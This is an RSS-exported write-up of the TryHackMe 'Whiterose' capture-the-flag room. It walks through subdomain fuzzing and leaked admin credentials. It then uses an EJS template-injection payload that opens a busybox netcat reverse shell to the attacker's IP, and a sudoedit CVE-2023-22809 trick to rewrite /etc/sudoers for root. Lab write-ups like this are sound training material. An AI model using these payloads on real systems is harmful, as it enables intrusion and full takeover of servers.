<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[YouTube TryHackMe]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>YouTube TryHackMe</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Sat, 02 Nov 2024 13:08:48 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Sat, 02 Nov 2024 13:08:47 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[Whiterose]]></title><description><![CDATA[ 
 <br><br>by <a data-tooltip-position="top" aria-label="https://tryhackme.com/r/p/ngn" rel="noopener nofollow" class="external-link" href="https://tryhackme.com/r/p/ngn" target="_blank">ngn</a> <br><img alt="Pasted image 20241102171341.png" src="pasted-image-20241102171341.png"><br>
Yet another Mr. Robot themed challenge.<br>Room link: <a rel="noopener nofollow" class="external-link" href="https://tryhackme.com/r/room/whiterose" target="_blank">https://tryhackme.com/r/room/whiterose</a><br><br><br>This challenge is based on the Mr. Robot episode "409 Conflict". Contains spoilers!<br>Go ahead and start the machine, it may take a few minutes to fully start up.<br>And oh! I almost forgot! - You will need these:&nbsp;Olivia Cortez:olivi8<br><br>Once we make sure that we are able to access the target system by using ping, we can start with our basic nmap scan<br>$ sudo nmap -p- -T5 10.10.240.72<br><img alt="Pasted image 20241102173018.png" src="pasted-image-20241102173018.png"><br>From the output, we can see that the target system has 2 ports open, Port 22 and Port 80.<br>When visiting for the webpage using the IP Address, the webapge is being redirected to cyprusbank.thm. So, you can edit the /etc/hosts file to add the server address to the domain name.<br>$ sudo nano /etc/hosts
Copy<br>
10.10.240.72 cyprusbank.thm

Copy<br><img alt="Pasted image 20241102172226.png" src="pasted-image-20241102172226.png"><br>After we have reloaded the page, we only see a static page without any functions or features defined.<br><img alt="Pasted image 20241102172349.png" src="pasted-image-20241102172349.png"><br>Therefor, we can now try to find for any files to be present in the sever which we can try accessing.<br>In this case, we will be using ffuf for fuzzing for the files.<br>$ ffuf -w Pranava__Rao/Tools/Fuzzing\ List/SecLists/Discovery/Web-Content/raft-medium-files.txt:FUZZ -u http://cyprusbank.thm/FUZZ
Copy<br><img alt="Pasted image 20241102172705.png" src="pasted-image-20241102172705.png"><br>And we find nothing from the server. We can try to find some virtual hosts under the domain using ffuf itself.<br>$ ffuf -w Pranava__Rao/Tools/Fuzzing\ List/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyprusbank.thm/ -H "HOST:FUZZ.cyprusbank.thm" -fw 1
Copy<br><img alt="Pasted image 20241102172840.png" src="pasted-image-20241102172840.png"><br>We instantly see an admin subdomain being shown up to us, which means that we have a valid vhost that we can now start to enumerate.<br><br>First off, let's edit the /etc/hosts file again to add the subdomain to be able to access it through the browser.<br>sudo nano /etc/hosts
Copy<br><img alt="Pasted image 20241102173232.png" src="pasted-image-20241102173232.png"><br>The index page of admin.cyprusbank.thm redirects us the /login page which then asks us the credentials for logging in. We can use the credentials that we obtained from the Challenge description.<br>
<br>Username: Olivia Cortez
<br>Password: olivi8
<br><img alt="Pasted image 20241102173627.png" src="pasted-image-20241102173627.png"><br>We can log in as Olivia Cortez, but that user has only have limited permission. We cannot read all the data, and the settings page is not allowed to be accessed with this user's privilege.<br><img alt="Pasted image 20241102173817.png" src="pasted-image-20241102173817.png"><br><img alt="Pasted image 20241102173828.png" src="pasted-image-20241102173828.png"><br><br>When we look at that Messages tab, we can see a list of chat logs that is happening.<br><img alt="Pasted image 20241102173947.png" src="pasted-image-20241102173947.png"><br>But also notice the URL here: http://admin.cyprusbank.thm/messages/?c=5<br>We can see ?c=5 which is the count of messages that is being displayed to us.<br>But if we modify the count to 0, we can see the entire chat history from the point where the chat box had started.<br>http://admin.cyprusbank.thm/messages/?c=0<br><img alt="Pasted image 20241102174130.png" src="pasted-image-20241102174130.png"><br>In which we also find the credentials of Gayle Bev who seems to be an admin with a level of access to the server.<br><br>Now, logout of the current user and login with the credentials of Gayle Bev.<br>
<br>Username: Gayle Bev
<br>Passwor: p~]P@5!6;rs558:q
<br><img alt="Pasted image 20241102174359.png" src="pasted-image-20241102174359.png"><br>We are now able to read the telephone numbers.<br><img alt="Pasted image 20241102174451.png" src="pasted-image-20241102174451.png"><br>Now under the settings page. Here, we can reset the customer's passwords. What is noticeable is that the passwords are reflected after we change them.<br><img alt="Pasted image 20241102174633.png" src="pasted-image-20241102174633.png"><br>This immediately draws attention to XSS or SSTI.<br><br>Let' intercept the password reset functionality using the Burp Suite and then forward the request to Repeater.<br><img alt="Pasted image 20241102174955.png" src="pasted-image-20241102174955.png"><br>After a bit of understanding, we notice that, if we remove the password field from the equation and then send the request, we get an error message. This tells us that the ejs files are being used in the Backend.<br><img alt="Pasted image 20241102175140.png" src="pasted-image-20241102175140.png"><br><br>By some searches from the internet we can find really useful blog post from eslam.io (<a data-tooltip-position="top" aria-label="https://eslam.io/posts/ejs-server-side-template-injection-rce/" rel="noopener nofollow" class="external-link" href="https://eslam.io/posts/ejs-server-side-template-injection-rce/" target="_blank">EJS, Server side template injection RCE (CVE-2022-29078) - writeup</a>) which explains us as well as showcases us the RCE Exploit.<br><img alt="Pasted image 20241102175408.png" src="pasted-image-20241102175408.png"><br>So, now, let's modify this payload to our use, in this case, I will be using reverse shell payload generated from <a data-tooltip-position="top" aria-label="https://www.revshells.com/" rel="noopener nofollow" class="external-link" href="https://www.revshells.com/" target="_blank">Revshells</a> using the BusyBox reverse shell.<br><img alt="Pasted image 20241102175724.png" src="pasted-image-20241102175724.png"><br>Our Payload is:<br>
&amp;settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.17.0.180 9001 -e sh');s

Copy<br>Before we actually pass this payload through BurpSuite's let first setup a listener<br>nc -lvnp 9001
Copy<br><img alt="Pasted image 20241102175859.png" src="pasted-image-20241102175859.png"><br>And now, pass the payload.<br><img alt="Pasted image 20241102175935.png" src="pasted-image-20241102175935.png"><br>And we can see the connection being made to our system.<br><img alt="Pasted image 20241102175957.png" src="pasted-image-20241102175957.png"><br>Now! We got a shell!!!<br>Let's upgrade the Shell to be a bit more useful than what we have right now, which we can do through python.<br>First, type in the following command:<br>python3 -c 'import pty; pty.spawn("/bin/bash")'
Copy<br>Spawning /bin/bash using <a data-tooltip-position="top" aria-label="https://docs.python.org/3/library/pty.html" rel="noopener nofollow" class="external-link" href="https://docs.python.org/3/library/pty.html" target="_blank">Pythonâ€™s PTY module</a>, and connect the controlling shell with its standard I/O.<br>Then, once you get a shell, press Ctrl + Z which will backend the shell, then update the local terminal line settings with stty and bring the remote shell back.<br>stty raw -echo &amp;&amp; fg
Copy<br><img alt="Pasted image 20241102180357.png" src="pasted-image-20241102180357.png"><br>Now, let's go the /home directory and get the first flag.<br><img alt="Pasted image 20241102180521.png" src="pasted-image-20241102180521.png"><br><br>When we run the command sudo -l we see that we are allowed to run sudoedit as root without a password using sudo for the specific file /etc/nginx/sites-available/admin.cyprusbank.thm<br><img alt="Pasted image 20241102180658.png" src="pasted-image-20241102180658.png"><br>There is a vulnerability in the version of the sudoedit that we are using in the target system (CVE-2023-22809).<br><img alt="Pasted image 20241102180807.png" src="pasted-image-20241102180807.png"><br>Now, understand and following this Blog <a data-tooltip-position="top" aria-label="https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis" rel="noopener nofollow" class="external-link" href="https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis" target="_blank">CVE-2023-22809: Sudoedit Bypass - Analysis</a> we can make the sudoedit file open any file that we want with the root privilege.<br>To escalate our privileges to root, we attempt to edit the /etc/sudoers file using the explanation from the blog.<br><img alt="Pasted image 20241102181140.png" src="pasted-image-20241102181140.png"><br>export EDITOR="vi -- /etc/sudoers"
Copy<br>then:<br>sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
Copy<br>Here we target the line with the command allowing us to execute that specifies the sudoedit command:<br>web ALL=(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
Copy<br>and replace it with the following:<br>web ALL=(root) NOPASSWD: ALL
Copy<br><img alt="Pasted image 20241102181425.png" src="pasted-image-20241102181425.png"><br>Now, when you run the command sudo su, you will be be a root and user.<br><img alt="Pasted image 20241102181554.png" src="pasted-image-20241102181554.png"><br>now, you can print out the root flag.<br><img alt="Pasted image 20241102181709.png" src="pasted-image-20241102181709.png"><br>And we finish it!!!!<br>]]></description><link>whiterose.html</link><guid isPermaLink="false">Whiterose.md</guid><pubDate>Sat, 02 Nov 2024 12:47:28 GMT</pubDate><enclosure url="pasted-image-20241102171341.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;pasted-image-20241102171341.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>